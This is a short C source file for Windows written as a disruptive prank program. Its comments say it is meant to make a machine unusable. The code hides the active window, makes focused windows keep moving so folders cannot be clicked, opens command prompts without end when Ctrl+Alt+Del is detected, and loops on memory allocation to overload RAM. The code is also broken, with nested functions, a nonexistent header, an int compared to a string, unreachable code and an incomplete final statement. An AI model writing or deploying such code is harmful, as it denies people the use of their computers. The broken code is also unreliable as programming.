#include <windows.h>
#include <math.h>
#include <conio.h>
#include <stdlib.h>
#include <sys.h>

// move window anywhere on the screen (makes it messy and unable to click any folders)
start() {
    DWORD WINAPI moveit(){
        HWND a=GetForegroundWindow();
        int i,j,k=1;
        while(k++){
            i=200+300*cos(k);
            j=150+300*sin(k);
            MoveWindow(a,i,j,i,j,1);
            Sleep(50);
        }
    }

    main(){
        // get foreground window
        DWORD dwThreadId;
        HWND last=GetForegroundWindow();
        ShowWindow(last, SW_HIDE);
        while(1){
            if (last!=GetForegroundWindow()) {
                last=GetForegroundWindow();
                CreateThread(NULL, 0, moveit, &last, 0, &dwThreadId);
            }
        }
        // if user enterd CTRL+ALT+DEL add new tabs
        int delkey = getch();
        if (delkey == "CTRL+ALT+DEL") {
        // open cmd's (command prompt's)
            while(1){
                system("start cmd");
            }
        }
        // overload ram
        while(malloc(1000))
    }
}
